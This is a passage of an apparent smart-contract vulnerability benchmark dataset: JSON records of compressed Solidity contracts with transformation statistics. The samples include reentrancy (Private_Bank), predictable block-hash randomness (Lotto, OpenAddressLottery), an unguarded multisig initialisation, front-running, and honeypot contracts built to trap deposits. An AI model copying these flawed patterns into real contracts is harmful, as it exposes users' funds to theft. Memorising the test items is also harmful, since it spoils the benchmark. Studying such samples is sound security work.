address) public master;\nconstructor() payable public{\ntarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\nmaster[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n}\nfunction() public payable{\nif(msg.sender != target[0]){\ntarget[0].call.value(msg.value).gas(600000)();\n}\n}\nfunction withdraw() public{\nrequire(msg.sender == master[0]);\nmaster[0].transfer(address(this).balance);\n}\n}\nlibrary SafeMath {\nfunction mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\nif (a == 0) {\nreturn 0;\n}\nc = a * b;\nassert(c / a == b);\nreturn c;\n}\nfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\nreturn a / b;\n}\nfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\nassert(b <= a);\nreturn a - b;\n}\nfunction add(uint256 a, uint256 b) internal pure returns (uint256 c) {\nc = a + b;\nassert(c >= a);\nreturn c;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 21,
        "mode": "compressed",
        "original_lines": 127,
        "transformed_lines": 86,
        "original_chars": 2712,
        "transformed_chars": 2091,
        "compression_ratio": 0.77
      },
      "error": null
    },
    {
      "original_id": "sn_ds_172",
      "transformed_id": "ss_l1_compressed_sn_ds_172",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract FundManager {\naddress public winner = 0x0;\naddress public owner;\naddress public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;\naddress public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;\naddress[] public players;\nmapping(address=>bool) approvedPlayers;\nuint256 public secret;\nuint256[] public seed = [951828771,158769871220];\nuint256[] public balance;\nfunction DranMe() public payable{\nowner = msg.sender;\n}\nmodifier onlyOwner() {\nrequire(msg.sender == owner);\n_;\n}\nmodifier onlyWinner() {\nrequire(msg.sender == winner);\n_;\n}\nmodifier onlyPlayers() {\nrequire(approvedPlayers[msg.sender]);\n_;\n}\nfunction getLength() public constant returns(uint256) {\nreturn seed.length;\n}\nfunction setSecret(uint256 _secret) public payable onlyOwner{\nsecret = _secret;\n}\nfunction getPlayerCount() public constant returns(uint256) {\nreturn players.length;\n}\nfunction getPrize() public constant returns(uint256) {\nreturn address(this).balance;\n}\nfunction becomePlayer() public payable{\nrequire(msg.value >= 0.02 ether);\nplayers.push(msg.sender);\napprovedPlayers[msg.sender]=true;\n}\nfunction manipulateSecret() public payable onlyPlayers{\nrequire (msg.value >= 0.01 ether);\nif(msg.sender!=owner || unlockSecret()){\nuint256 amount = 0;\nmsg.sender.transfer(amount);\n}\n}\nfunction unlockSecret() private returns(bool){\nbytes32 hash = keccak256(blockhash(block.number-1));\nuint256 secret = uint256(hash);\nif(secret%5==0){\nwinner = msg.sender;\nreturn true;\n}\nelse{\nreturn false;\n}\n}\nfunction callFirstTarget () public payable onlyPlayers {\nrequire (msg.value >= 0.005 ether);\nfirstTarget.call.value(msg.value)();\n}\nfunction callSecondTarget () public payable onlyPlayers {\nrequire (msg.value >= 0.005 ether);\nsecondTarget.call.value(msg.value)();\n}\nfunction setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {\nseed[_index] = _value;\n}\nfunction addSeed (uint256 _add) public payable onlyPlayers {\nseed.length = _add;\n}\nfunction guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {\nreturn (_seed / (seed[0]*seed[1]));\nif((_seed / (seed[0]*seed[1])) == secret) {\nowner = winner;\n}\n}\nfunction checkSecret () public payable onlyPlayers returns(bool) {\nrequire(msg.value >= 0.01 ether);\nif(msg.value == secret){\nreturn true;\n}\n}\nfunction winPrize() public payable onlyOwner {\nowner.call.value(1 wei)();\n}\nfunction claimPrize() public payable onlyWinner {\nwinner.transfer(address(this).balance);\n}\nfunction() public payable{\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 134,
        "transformed_lines": 96,
        "original_chars": 2806,
        "transformed_chars": 2491,
        "compression_ratio": 0.89
      },
      "error": null
    },
    {
      "original_id": "sn_ds_173",
      "transformed_id": "ss_l1_compressed_sn_ds_173",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.11;\ncontract Owned {\nfunction Owned() {\nowner = msg.sender;\n}\naddress public owner;\nmodifier onlyOwner { if (msg.sender == owner) _; }\nfunction changeOwner(address _newOwner) onlyOwner {\nowner = _newOwner;\n}\nfunction execute(address _dst, uint _value, bytes _data) onlyOwner {\n_dst.call.value(_value)(_data);\n}\n}\ncontract Token {\nfunction transfer(address, uint) returns(bool);\nfunction balanceOf(address) constant returns (uint);\n}\ncontract TokenSender is Owned {\nToken public token;\nuint public totalToDistribute;\nuint public next;\nstruct Transfer {\naddress addr;\nuint amount;\n}\nTransfer[] public transfers;\nfunction TokenSender(address _token) {\ntoken = Token(_token);\n}\nuint constant D160 = 0x0010000000000000000000000000000000000000000;\nfunction fill(uint[] data) onlyOwner {\nif (next>0) throw;\nuint acc;\nuint offset = transfers.length;\ntransfers.length = transfers.length + data.length;\nfor (uint i = 0; i < data.length; i++ ) {\naddress addr = address( data[i] & (D160-1) );\nuint amount = data[i] / D160;\ntransfers[offset + i].addr = addr;\ntransfers[offset + i].amount = amount;\nacc += amount;\n}\ntotalToDistribute += acc;\n}\nfunction run() onlyOwner {\nif (transfers.length == 0) return;\nuint mNext = next;\nnext = transfers.length;\nif ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;\nwhile ((mNext<transfers.length) && ( gas() > 150000 )) {\nuint amount = transfers[mNext].amount;\naddress addr = transfers[mNext].addr;\nif (amount > 0) {\nif (!token.transfer(addr, transfers[mNext].amount)) throw;\n}\nmNext ++;\n}\nnext = mNext;\n}\nfunction hasTerminated() constant returns (bool) {\nif (transfers.length == 0) return false;\nif (next < transfers.length) return false;\nreturn true;\n}\nfunction nTransfers() constant returns (uint) {\nreturn transfers.length;\n}\nfunction gas() internal constant returns (uint _gas) {\nassembly {\n_gas:= gas\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 123,
        "transformed_lines": 74,
        "original_chars": 3810,
        "transformed_chars": 1880,
        "compression_ratio": 0.49
      },
      "error": null
    },
    {
      "original_id": "sn_ds_174",
      "transformed_id": "ss_l1_compressed_sn_ds_174",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract Lotto {\nuint constant public blocksPerRound = 6800;\nuint constant public ticketPrice = 100000000000000000;\nuint constant public blockReward = 5000000000000000000;\nfunction getBlocksPerRound() constant returns(uint){ return blocksPerRound; }\nfunction getTicketPrice() constant returns(uint){ return ticketPrice; }\nstruct Round {\naddress[] buyers;\nuint pot;\nuint ticketsCount;\nmapping(uint=>bool) isCashed;\nmapping(address=>uint) ticketsCountByBuyer;\n}\nmapping(uint => Round) rounds;\nfunction getRoundIndex() constant returns (uint){\nreturn block.number/blocksPerRound;\n}\nfunction getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){\nreturn rounds[roundIndex].isCashed[subpotIndex];\n}\nfunction calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){\nvar decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\nif(decisionBlockNumber>block.number)\nreturn;\nvar decisionBlockHash = getHashOfBlock(decisionBlockNumber);\nvar winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount;\nvar ticketIndex = uint256(0);\nfor(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){\nvar buyer = rounds[roundIndex].buyers[buyerIndex];\nticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer];\nif(ticketIndex>winningTicketIndex){\nreturn buyer;\n}\n}\n}\nfunction getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){\nreturn ((roundIndex+1)*blocksPerRound)+subpotIndex;\n}\nfunction getSubpotsCount(uint roundIndex) constant returns(uint){\nvar subpotsCount = rounds[roundIndex].pot/blockReward;\nif(rounds[roundIndex].pot%blockReward>0)\nsubpotsCount++;\nreturn subpotsCount;\n}\nfunction getSubpot(uint roundIndex) constant returns(uint){\nreturn rounds[roundIndex].pot/getSubpotsCount(roundIndex);\n}\nfunction cash(uint roundIndex, uint subpotIndex){\nvar subpotsCount = getSubpotsCount(roundIndex);\nif(subpotIndex>=subpotsCount)\nreturn;\nvar decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\nif(decisionBlockNumber>block.number)\nreturn;\nif(rounds[roundIndex].isCashed[subpotIndex])\nreturn;\nvar winner = calculateWinner(roundIndex,subpotIndex);\nvar subpot = getSubpot(roundIndex);\nwinner.send(subpot);\nrounds[roundIndex].isCashed[subpotIndex] = true;\n}\nfunction getHashOfBlock(uint blockIndex) constant returns(uint){\nreturn uint(block.blockhash(blockIndex));\n}\nfunction getBuyers(uint roundIndex,address buyer) constant returns (address[]){\nreturn rounds[roundIndex].buyers;\n}\nfunction getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){\nreturn rounds[roundIndex].ticketsCountByBuyer[buyer];\n}\nfunction getPot(uint roundIndex) constant returns(uint){\nreturn rounds[roundIndex].pot;\n}\nfunction() {\nvar roundIndex = getRoundIndex();\nvar value = msg.value-(msg.value%ticketPrice);\nif(value==0) return;\nif(value<msg.value){\nmsg.sender.send(msg.value-value);\n}\nvar ticketsCount = value/ticketPrice;\nrounds[roundIndex].ticketsCount+=ticketsCount;\nif(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){\nvar buyersLength = rounds[roundIndex].buyers.length++;\nrounds[roundIndex].buyers[buyersLength] = msg.sender;\n}\nrounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount;\nrounds[roundIndex].ticketsCount+=ticketsCount;\nrounds[roundIndex].pot+=value;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 47,
        "mode": "compressed",
        "original_lines": 153,
        "transformed_lines": 92,
        "original_chars": 5449,
        "transformed_chars": 3328,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_ds_201",
      "transformed_id": "ss_l1_compressed_sn_ds_201",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Private_Bank {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\nLog TransferLog;\nfunction Private_Bank(address _log) {\nTransferLog = Log(_log);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value >= MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am) {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 69,
        "transformed_lines": 44,
        "original_chars": 1244,
        "transformed_chars": 880,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_202",
      "transformed_id": "ss_l1_compressed_sn_ds_202",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Multiplicator {\naddress public Owner = msg.sender;\nfunction()payable{}\nfunction withdraw()\npayable\npublic {\nrequire(msg.sender == Owner);\nOwner.transfer(this.balance);\n}\nfunction multiplicate(address adr)\npayable {\nif(msg.value>=this.balance) {\nadr.transfer(this.balance+msg.value);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 26,
        "transformed_lines": 17,
        "original_chars": 454,
        "transformed_chars": 322,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_203",
      "transformed_id": "ss_l1_compressed_sn_ds_203",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Ownable {\naddress public owner;\nfunction Ownable() public {owner = msg.sender;}\nmodifier onlyOwner() {require(msg.sender == owner); _;\n}\n}\ncontract CEOThrone is Ownable {\naddress public owner;\nuint public largestStake;\nfunction Stake() public payable {\nif (msg.value > largestStake) {\nowner = msg.sender;\nlargestStake = msg.value;\n}\n}\nfunction withdraw() public onlyOwner {\nmsg.sender.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 32,
        "transformed_lines": 20,
        "original_chars": 1107,
        "transformed_chars": 446,
        "compression_ratio": 0.4
      },
      "error": null
    },
    {
      "original_id": "sn_ds_204",
      "transformed_id": "ss_l1_compressed_sn_ds_204",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "contract OpenAddressLottery{\nstruct SeedComponents{\nuint component1;\nuint component2;\nuint component3;\nuint component4;\n}\naddress owner;\nuint private secretSeed;\nuint private lastReseed;\nuint LuckyNumber = 7;\nmapping (address => bool) winner;\nfunction OpenAddressLottery() {\nowner = msg.sender;\nreseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));\n}\nfunction participate() payable {\nif(msg.value<0.1 ether)\nreturn;\nrequire(winner[msg.sender] == false);\nif(luckyNumberOfAddress(msg.sender) == LuckyNumber){\nwinner[msg.sender] = true;\nuint win=msg.value*7;\nif(win>this.balance)\nwin=this.balance;\nmsg.sender.transfer(win);\n}\nif(block.number-lastReseed>1000)\nreseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp));\n}\nfunction luckyNumberOfAddress(address addr) constant returns(uint n){\nn = uint(keccak256(uint(addr), secretSeed)[0]) % 8;\n}\nfunction reseed(SeedComponents components) internal {\nsecretSeed = uint256(keccak256(\ncomponents.component1,\ncomponents.component2,\ncomponents.component3,\ncomponents.component4\n));\nlastReseed = block.number;\n}\nfunction kill() {\nrequire(msg.sender==owner);\nselfdestruct(msg.sender);\n}\nfunction forceReseed() {\nrequire(msg.sender==owner);\nSeedComponents s;\ns.component1 = uint(msg.sender);\ns.component2 = uint256(block.blockhash(block.number - 1));\ns.component3 = block.difficulty*(uint)(block.coinbase);\ns.component4 = tx.gasprice * 7;\nreseed(s);\n}\nfunction () payable {\nif(msg.value>=0.1 ether && msg.sender!=owner)\nparticipate();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 20,
        "mode": "compressed",
        "original_lines": 81,
        "transformed_lines": 60,
        "original_chars": 2914,
        "transformed_chars": 1560,
        "compression_ratio": 0.54
      },
      "error": null
    },
    {
      "original_id": "sn_ds_205",
      "transformed_id": "ss_l1_compressed_sn_ds_205",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract NEW_YEARS_GIFT {\nstring message;\nbool passHasBeenSet = false;\naddress sender;\nbytes32 public hashPass;\nfunction() public payable{}\nfunction GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}\nfunction SetPass(bytes32 hash)\npublic\npayable {\nif( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 ) {\nhashPass = hash;\nsender = msg.sender;\n}\n}\nfunction SetMessage(string _message)\npublic {\nif(msg.sender==sender) {\nmessage =_message;\n}\n}\nfunction GetGift(bytes pass)\nexternal\npayable\nreturns (string) {\nif(hashPass == sha3(pass)) {\nmsg.sender.transfer(this.balance);\nreturn message;\n}\n}\nfunction Revoce()\npublic\npayable {\nif(msg.sender==sender) {\nsender.transfer(this.balance);\nmessage=\"\";\n}\n}\nfunction PassHasBeenSet(bytes32 hash)\npublic {\nif(msg.sender==sender&&hash==hashPass) {\npassHasBeenSet=true;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 12,
        "mode": "compressed",
        "original_lines": 69,
        "transformed_lines": 46,
        "original_chars": 1247,
        "transformed_chars": 869,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_206",
      "transformed_id": "ss_l1_compressed_sn_ds_206",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Test1 {\naddress owner = msg.sender;\nfunction withdraw()\npayable\npublic {\nrequire(msg.sender==owner);\nowner.transfer(this.balance);\n}\nfunction() payable {}\nfunction Test()\npayable\npublic {\nif(msg.value>=1 ether) {\nvar i1 = 1;\nvar i2 = 0;\nvar amX2 = msg.value*2;\nwhile(true) {\nif(i1<i2)break;\nif(i1>amX2)break;\ni2=i1;\ni1++;\n}\nmsg.sender.transfer(i2);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 8,
        "mode": "compressed",
        "original_lines": 40,
        "transformed_lines": 27,
        "original_chars": 663,
        "transformed_chars": 388,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_ds_207",
      "transformed_id": "ss_l1_compressed_sn_ds_207",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract ERC20 {\nfunction totalSupply() constant returns (uint totalSupply);\nfunction balanceOf(address _owner) constant returns (uint balance);\nfunction transfer(address _to, uint _value) returns (bool success);\nfunction transferFrom(address _from, address _to, uint _value) returns (bool success);\nfunction approve(address _spender, uint _value) returns (bool success);\nfunction allowance(address _owner, address _spender) constant returns (uint remaining);\nevent Transfer(address indexed _from, address indexed _to, uint _value);\nevent Approval(address indexed _owner, address indexed _spender, uint _value);\n}\ncontract RaceCondition{\naddress private owner;\nuint public price;\nERC20 token;\nfunction RaceCondition(uint _price, ERC20 _token)\npublic {\nowner = msg.sender;\nprice = _price;\ntoken = _token;\n}\nfunction buy(uint new_price) payable\npublic {\nrequire(msg.value >= price);\ntoken.transferFrom(msg.sender, owner, price);\nprice = new_price;\nowner = msg.sender;\n}\nfunction changePrice(uint new_price){\nrequire(msg.sender == owner);\nprice = new_price;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 9,
        "mode": "compressed",
        "original_lines": 51,
        "transformed_lines": 33,
        "original_chars": 1618,
        "transformed_chars": 1083,
        "compression_ratio": 0.67
      },
      "error": null
    },
    {
      "original_id": "sn_ds_208",
      "transformed_id": "ss_l1_compressed_sn_ds_208",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.4.9;\ncontract WalletEvents {\nevent Confirmation(address owner, bytes32 operation);\nevent Revoke(address owner, bytes32 operation);\nevent OwnerChanged(address oldOwner, address newOwner);\nevent OwnerAdded(address newOwner);\nevent OwnerRemoved(address oldOwner);\nevent RequirementChanged(uint newRequirement);\nevent Deposit(address _from, uint value);\nevent SingleTransact(address owner, uint value, address to, bytes data, address created);\nevent MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);\nevent ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);\n}\ncontract WalletAbi {\nfunction revoke(bytes32 _operation) external;\nfunction changeOwner(address _from, address _to) external;\nfunction addOwner(address _owner) external;\nfunction removeOwner(address _owner) external;\nfunction changeRequirement(uint _newRequired) external;\nfunction isOwner(address _addr) constant returns (bool);\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);\nfunction setDailyLimit(uint _newLimit) external;\nfunction execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);\nfunction confirm(bytes32 _h) returns (bool o_success);\n}\ncontract WalletLibrary is WalletEvents {\nstruct PendingState {\nuint yetNeeded;\nuint ownersDone;\nuint index;\n}\nstruct Transaction {\naddress to;\nuint value;\nbytes data;\n}\nmodifier onlyowner {\nif (isOwner(msg.sender))\n_;\n}\nmodifier onlymanyowners(bytes32 _operation) {\nif (confirmAndCheck(_operation))\n_;\n}\nfunction() payable {\nif (msg.value > 0)\nDeposit(msg.sender, msg.value);\n}\nfunction initMultiowned(address[] _owners, uint _required) {\nm_numOwners = _owners.length + 1;\nm_owners[1] = uint(msg.sender);\nm_ownerIndex[uint(msg.sender)] = 1;\nfor (uint i = 0; i < _owners.length; ++i) {\nm_owners[2 + i] = uint(_owners[i]);\nm_ownerIndex[uint(_owners[i])] = 2 + i;\n}\nm_required = _required;\n}\nfunction revoke(bytes32 _operation) external {\nuint ownerIndex = m_ownerIndex[uint(msg.sender)];\nif (ownerIndex == 0) return;\nuint ownerIndexBit = 2**ownerIndex;\nvar pending = m_pending[_operation];\nif (pending.ownersDone & ownerIndexBit > 0) {\npending.yetNeeded++;\npending.ownersDone -= ownerIndexBit;\nRevoke(msg.sender, _operation);\n}\n}\nfunction changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {\nif (isOwner(_to)) return;\nuint ownerIndex = m_ownerIndex[uint(_from)];\nif (ownerIndex == 0) return;\nclearPending();\nm_owners[ownerIndex] = uint(_to);\nm_ownerIndex[uint(_from)] = 0;\nm_ownerIndex[uint(_to)] = ownerIndex;\nOwnerChanged(_from, _to);\n}\nfunction addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\nif (isOwner(_owner)) return;\nclearPending();\nif (m_numOwners >= c_maxOwners)\nreorganizeOwners();\nif (m_numOwners >= c_maxOwners)\nreturn;\nm_numOwners++;\nm_owners[m_numOwners] = uint(_owner);\nm_ownerIndex[uint(_owner)] = m_numOwners;\nOwnerAdded(_owner);\n}\nfunction removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return;\nif (m_required > m_numOwners - 1) return;\nm_owners[ownerIndex] = 0;\nm_ownerIndex[uint(_owner)] = 0;\nclearPending();\nreorganizeOwners();\nOwnerRemoved(_owner);\n}\nfunction changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {\nif (_newRequired > m_numOwners) return;\nm_required = _newRequired;\nclearPending();\nRequirementChanged(_newRequired);\n}\nfunction getOwner(uint ownerIndex) external constant returns (address) {\nreturn address(m_owners[ownerIndex + 1]);\n}\nfunction isOwner(address _addr) constant returns (bool) {\nreturn m_ownerIndex[uint(_addr)] > 0;\n}\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\nvar pending = m_pending[_operation];\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return false;\nuint ownerIndexBit = 2**ownerIndex;\nreturn !(pending.ownersDone & ownerIndexBit == 0);\n}\nfunction initDaylimit(uint _limit) {\nm_dailyLimit = _limit;\nm_lastDay = today();\n}\nfunction setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {\nm_dailyLimit = _newLimit;\n}\nfunction resetSpentToday() onlymanyowners(sha3(msg.data)) external {\nm_spentToday = 0;\n}\nfunction initWallet(address[] _owners, uint _required, uint _daylimit) {\ninitDaylimit(_daylimit);\ninitMultiowned(_owners, _required);\n}\nfunction kill(address _to) onlymanyowners(sha3(msg.data)) external {\nsuicide(_to);\n}\nfunction execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {\nif ((_data.length == 0 && underLimit(_value)) || m_required == 1) {\naddress created;\nif (_to == 0) {\ncreated = create(_value, _data);\n} else {\nif (!_to.call.value(_value)(_data))\nthrow;\n}\nSingleTransact(msg.sender, _value, _to, _data, created);\n} else {\no_hash = sha3(msg.data, block.number);\nif (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {\nm_txs[o_hash].to = _to;\nm_txs[o_hash].value = _value;\nm_txs[o_hash].data = _data;\n}\nif (!confirm(o_hash)) {\nConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);\n}\n}\n}\nfunction create(uint _value, bytes _code) internal returns (address o_addr) {\nassembly {\no_addr := create(_value, add(_code, 0x20), mload(_code))\njumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))\n}\n}\nfunction confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {\nif (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {\naddress created;\nif (m_txs[_h].to == 0) {\ncreated = create(m_txs[_h].value, m_txs[_h].data);\n} else {\nif (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))\nthrow;\n}\nMultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);\ndelete m_txs[_h];\nreturn true;\n}\n}\nfunction confirmAndCheck(bytes32 _operation) internal returns (bool) {\nuint ownerIndex = m_ownerIndex[uint(msg.sender)];\nif (ownerIndex == 0) return;\nvar pending = m_pending[_operation];\nif (pending.yetNeeded == 0) {\npending.yetNeeded = m_required;\npending.ownersDone = 0;\npending.index = m_pendingIndex.length++;\nm_pendingIndex[pending.index] = _operation;\n}\nuint ownerIndexBit = 2**ownerIndex;\nif (pending.ownersDone & ownerIndexBit == 0) {\nConfirmation(msg.sender, _operation);\nif (pending.yetNeeded <= 1) {\ndelete m_pendingIndex[m_pending[_operation].index];\ndelete m_pending[_operation];\nreturn true;\n}\nelse {\npending.yetNeeded--;\npending.ownersDone |= ownerIndexBit;\n}\n}\n}\nfunction reorganizeOwners() private {\nuint free = 1;\nwhile (free < m_numOwners) {\nwhile (free < m_numOwners && m_owners[free] != 0) free++;\nwhile (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\nif (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0) {\nm_owners[free] = m_owners[m_numOwners];\nm_ownerIndex[m_owners[free]] = free;\nm_owners[m_numOwners] = 0;\n}\n}\n}\nfunction underLimit(uint _value) internal onlyowner returns (bool) {\nif (today() > m_lastDay) {\nm_spentToday = 0;\nm_lastDay = today();\n}\nif (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\nm_spentToday += _value;\nreturn true;\n}\nreturn false;\n}\nfunction today() private constant returns (uint) { return now / 1 days; }\nfunction clearPending() internal {\nuint length = m_pendingIndex.length;\nfor (uint i = 0; i < length; ++i) {\ndelete m_txs[m_pendingIndex[i]];\nif (m_pendingIndex[i] != 0)\ndelete m_pending[m_pendingIndex[i]];\n}\ndelete m_pendingIndex;\n}\naddress constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\nuint public m_required;\nuint public m_numOwners;\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\nuint[256] m_owners;\nuint constant c_maxOwners = 250;\nmapping(uint => uint) m_ownerIndex;\nmapping(bytes32 => PendingState) m_pending;\nbytes32[] m_pendingIndex;\nmapping (bytes32 => Transaction) m_txs;\n}\ncontract Wallet is WalletEvents {\nfunction Wallet(address[] _owners, uint _required, uint _daylimit) {\nbytes4 sig = bytes4(sha3(\"initWallet(address[],uint256,uint256)\"));\naddress target = _walletLibrary;\nuint argarraysize = (2 + _owners.length);\nuint argsize = (2 + argarraysize) * 32;\nassembly {\nmstore(0x0, sig)\ncodecopy(0x4, sub(codesize, argsize), argsize)\ndelegatecall(sub(gas, 10000), target, 0x0, add(argsize, 0x4), 0x0, 0x0)\n}\n}\nfunction() payable {\nif (msg.value > 0)\nDeposit(msg.sender, msg.value);\nelse if (msg.data.length > 0)\n_walletLibrary.delegatecall(msg.data);\n}\nfunction getOwner(uint ownerIndex) constant returns (address) {\nreturn address(m_owners[ownerIndex + 1]);\n}\nfunction hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\nreturn _walletLibrary.delegatecall(msg.data);\n}\nfunction isOwner(address _addr) constant returns (bool) {\nreturn _walletLibrary.delegatecall(msg.data);\n}\naddress constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\nuint public m_required;\nuint public m_numOwners;\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\nuint[256] m_owners;\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 104,
        "mode": "compressed",
        "original_lines": 461,
        "transformed_lines": 284,
        "original_chars": 16143,
        "transformed_chars": 9057,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_ds_209",
      "transformed_id": "ss_l1_compressed_sn_ds_209",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
